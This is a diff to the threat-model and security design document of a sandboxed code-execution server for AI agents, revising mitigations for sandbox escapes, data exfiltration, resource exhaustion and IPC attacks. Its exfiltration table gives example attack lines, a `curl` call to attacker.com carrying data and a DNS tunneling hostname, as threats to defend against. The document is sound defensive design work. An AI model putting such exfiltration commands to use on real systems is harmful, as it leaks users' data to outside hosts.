@@ -55,7 +55,7 @@ Sandboxed code execution MCP server for AI agents. Executes untrusted code in is
 
 | Vector | CVE Examples | Mitigation |
 |--------|--------------|------------|
-| **TIOCSTI injection** | CVE-2017-5226 | `setsid()` for new session, seccomp block on ioctl TIOCSTI |
+| **TIOCSTI injection** | CVE-2017-5226 | `setsid()` for new session |
 | User namespace kernel bugs | CVE-2024-1086, CVE-2023-32233 | Kernel updates, minimize userns if possible |
 | OverlayFS capability bypass | CVE-2023-2640 (Ubuntu) | Avoid Ubuntu-patched kernels, keep kernel updated |
 | /proc write escapes | CVE-2022-0492 (cgroups) | Read-only /proc/sys, no cgroup mounts |
@@ -79,16 +79,25 @@ Sandboxed code execution MCP server for AI agents. Executes untrusted code in is
 | Channel | Technique | Mitigation |
 |---------|-----------|------------|
 | Direct HTTP/S | `curl attacker.com/?data=...` | Domain allowlist (package registries only) |
-| DNS tunneling | `base64data.attacker.com` | Route DNS through controlled resolver |
+| DNS tunneling | `base64data.attacker.com` | Fixed resolvers with iptables restrictions |
 | Package registry abuse | Exfil via package publish or download params | Monitor unusual registry traffic patterns |
 | Allowed domain piggyback | Discord webhooks, webhook.site if allowed | Strict allowlist, no generic webhook domains |
+
+### Resource Exhaustion (P4)
+
+| Vector | Mechanism | Mitigation |
+|--------|-----------|------------|
+| Disk filling | Writing large files to overlay upper layer | cgroups v2 disk I/O limits, tmpfs size limits |
+| Memory exhaustion | Allocating unbounded memory | cgroups v2 memory limits |
+| Fork bombs | Spawning unlimited processes | cgroups v2 PID limits |
+| CPU starvation | Infinite loops, crypto mining | cgroups v2 CPU limits, execution timeouts |
 
 ### IPC-Based Attacks
 
 | Vector | Description | Mitigation |
 |--------|-------------|------------|
-| Abstract Unix sockets | Cross-sandbox communication via abstract namespace | Landlock IPC scoping (ABI v6, kernel 6.7+) |
-| Signal injection | Signals sent to processes outside sandbox | Landlock signal scoping (ABI v6) |
+| Abstract Unix sockets | Cross-sandbox communication via abstract namespace | Landlock IPC scoping (ABI v6, kernel 6.7+) — **required** |
+| Signal injection | Signals sent to processes outside sandbox | Landlock signal scoping (ABI v6) — **required** |
 | Shared memory | `/dev/shm` accessible across namespaces | Fresh tmpfs for /dev/shm, IPC namespace isolation |
 
 ## Security Controls
@@ -103,16 +112,18 @@ Sandboxed code execution MCP server for AI agents. Executes untrusted code in is
 6. **Fresh /dev**: Mount new devtmpfs, don't expose host TTYs
 7. **Network namespace**: Isolated network; allowlisted egress only if enabled
 8. **NO_NEW_PRIVS**: Set before any other restrictions to prevent privilege escalation via setuid
-9. **Seccomp filter**: Block dangerous syscalls (ptrace, mount, init_module, ioctl TIOCSTI) — applied **last**
+9. **Seccomp filter**: Block dangerous syscalls (ptrace, mount, init_module, etc.) — applied **last**
+10. **cgroups v2**: Resource limits for CPU, memory, PIDs, I/O — **required**
+11. **Landlock IPC scoping**: Restrict abstract Unix sockets and signals — **required** (kernel 6.7+)
+
+**Note on Landlock ptrace restrictions**: Landlock implicitly restricts ptrace — a sandboxed process can only ptrace targets in the same or nested Landlock domain. This provides defense-in-depth alongside CAP_SYS_PTRACE dropping.
 
 ### Recommended (P2/P3 Mitigations)
 
-1. **Landlock**: Filesystem access control as defense-in-depth (kernel 5.13+); apply to **merged** overlay path
-2. **Landlock IPC scoping**: Restrict abstract Unix sockets and signals (kernel 6.7+, ABI v6)
-3. **Read-only base**: OverlayFS lower layer read-only, writes to tmpfs/session upper
-4. **DNS control**: Route through resolving proxy with logging
-5. **Resource limits**: cgroups v2 for CPU, memory, PID limits
-6. **Timeout enforcement**: Kill long-running processes
+1. **Landlock filesystem**: Filesystem access control as defense-in-depth; apply to **merged** overlay path
+2. **Read-only base**: OverlayFS lower layer read-only, writes to tmpfs/session upper
+3. **DNS control**: Fixed resolvers (e.g., 8.8.8.8, 1.1.1.1) with iptables rules restricting DNS traffic to those IPs only
+4. **Timeout enforcement**: Kill long-running processes
 
 ### Configurable (User Choice)
 
@@ -165,6 +176,26 @@ The order of applying security controls matters. Incorrect ordering can either b
 
 **Why seccomp last**: The seccomp filter blocks syscalls. If applied too early, it may block syscalls needed for the setup steps above (mount, setns, prctl, etc.).
 
+### Seccomp and Network Syscalls
+
+The seccomp allowlist includes network-related syscalls (`socket`, `connect`, `sendto`, `recvfrom`, etc.) even when network isolation is the goal. This is intentional:
+
+1. **Network namespace provides isolation**: In an isolated network namespace, only loopback is available. Socket syscalls succeed but have no external connectivity.
+2. **Local tooling may need sockets**: Some tools use Unix domain sockets or localhost connections for IPC.
+3. **When egress is enabled**: The veth pair + iptables/proxy provides filtering at the network level, not syscall level.
+
+The seccomp filter focuses on blocking dangerous syscalls (ptrace, mount, etc.), not network policy enforcement.
+
+### DNS in Network-Enabled Sandboxes
+
+When network egress is enabled via veth pairs:
+
+1. Configure `/etc/resolv.conf` inside sandbox to point to well-known public resolvers (e.g., `8.8.8.8`, `1.1.1.1`)
+2. Apply iptables rules on the host side of the veth pair to:
+   - Allow UDP/TCP port 53 only to those specific resolver IPs
+   - Block DNS to any other destination
+3. This prevents DNS tunneling to attacker-controlled nameservers while allowing legitimate resolution
+
 ## Sandbox Filesystem Layout
 
 ```
@@ -173,7 +204,7 @@ The order of applying security controls matters. Incorrect ordering can either b
 ├── lib/, lib64/           # Read-only symlinks
 ├── bin/, sbin/            # Read-only from host
 ├── etc/                    # Minimal, sanitized
-├── tmp/                    # Writable (tmpfs)
+├── tmp/                    # Writable (tmpfs, size-limited)
 ├── home/sandbox/          # Writable (overlay upper)
 │   └── workspace/         # Bind-mount to project (overlay for writes)
 ├── proc/                   # Fresh procfs (hidepid=invisible)
@@ -194,11 +225,12 @@ Threats we explicitly do NOT defend against:
 
 - **Kernel 0-days**: We reduce attack surface but can't prevent unknown kernel bugs
 - **Hardware side channels**: Spectre/Meltdown mitigations are host responsibility
+- **Software timing side channels**: Timing attacks via cache/memory access patterns are out of scope
 - **Malicious MCP client**: The AI agent host (Claude, etc.) is trusted
 - **User misconfiguration**: If user disables protections, that's on them
 - **Pre-sandbox attacks**: Vulnerabilities in MCP server itself before sandboxing
 - **Cryptographic attacks**: Not in scope for this project
-
+- **TOCTOU in overlay setup**: We use atomic operations and O_NOFOLLOW, but sophisticated races are out of scope
 
 ## Implementation Checklist
 
@@ -206,15 +238,15 @@ Before any sandbox execution, in this order:
 
 - [ ] All namespaces unshared (user, mount, PID, network, IPC, UTS)
 - [ ] New session established (`setsid`)
-- [ ] Network configured (isolated or veth with allowlist)
+- [ ] Network configured (isolated or veth with allowlist + DNS restrictions)
 - [ ] Filesystem mounts prepared (overlay merged view)
 - [ ] Credential paths verified not mounted
 - [ ] All unnecessary file descriptors closed
 - [ ] Landlock rules applied to merged paths (if kernel supports)
-- [ ] Landlock IPC scoping enabled (if kernel 6.7+)
+- [ ] Landlock IPC scoping enabled (**required**, kernel 6.7+)
 - [ ] `NO_NEW_PRIVS` set via `prctl`
 - [ ] All capabilities dropped
-- [ ] Resource limits set (cgroups v2)
+- [ ] Resource limits set (cgroups v2) — **required**
 - [ ] Timeout scheduled
 - [ ] Seccomp filter installed (**last step**)
 
@@ -230,7 +262,9 @@ Security-critical tests:
 6. **Escape regression tests**: Reproduce known CVE patterns, verify blocked
 7. **FD inheritance**: Verify no unexpected FDs inherited by sandboxed process (`ls -la /proc/self/fd/`)
 8. **Landlock merged path**: Verify Landlock restrictions apply to overlay merged view
-9. **IPC isolation**: Verify abstract Unix socket connections fail across sandbox boundaries (kernel 6.7+)
+9. **IPC isolation**: Verify abstract Unix socket connections fail across sandbox boundaries
+10. **Resource limits**: Verify cgroups limits enforced (memory, PIDs, CPU)
+11. **DNS restrictions**: Verify DNS queries only reach allowed resolvers
 
 ## Incident Response
 
